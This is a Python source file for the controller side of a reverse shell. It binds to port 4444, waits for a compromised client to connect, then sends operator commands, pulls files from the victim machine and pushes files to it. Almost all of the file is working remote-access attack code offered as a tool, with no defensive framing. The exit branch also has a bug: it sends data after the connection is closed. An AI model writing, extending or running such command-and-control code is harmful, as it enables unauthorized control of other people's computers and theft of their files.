import socket,json
import base64


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)

        print("[+] Waiting for incoming connections...")
        self.connection, address = self.listener.accept()
        print(f"[+] Connection established from {address}")

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))


    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Sucessfull"
        
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8')



    def run(self):
        try:
            initial_message = self.connection.recv(1024).decode()
            print(f"Received initial message: {initial_message}")
            
            while True:
                command = input("Enter command to send to client: ")
                # Check for 'exit' command to close the connection
                if command == "exit":
                    print("Closing connection...")
                    self.connection.send("exit".encode())
                    self.connection.close()
                    print(f"Sending command to client: {command}")
                    result = self.execute_remotely(command)
                    print(result)  # Decode the result before printing
                    break

                elif command.startswith("download"):
                    print(f"Sending command to client: {command}")
                    result = self.execute_remotely(command)
                    file_name = command.split(" ")[1]
                    result = self.write_file(file_name, result)
                    print(result)
                
                elif command.startswith("upload"):
                    print(f"Sending command to client: {command}")
                    file_name = command.split(" ")[1]
                    file_content = self.read_file(file_name)
                    command += " " + file_content
                    result = self.execute_remotely(command)
                    print(result)
                
                else:
                    print(f"Sending command to client: {command}")
                    result = self.execute_remotely(command)
                    print(result)  # Decode the result before printing

        except Exception as e:
            print(f"Error encountered: {e}")


     

my_listener = Listener("192.168.1.64", 4444)
my_listener.run()
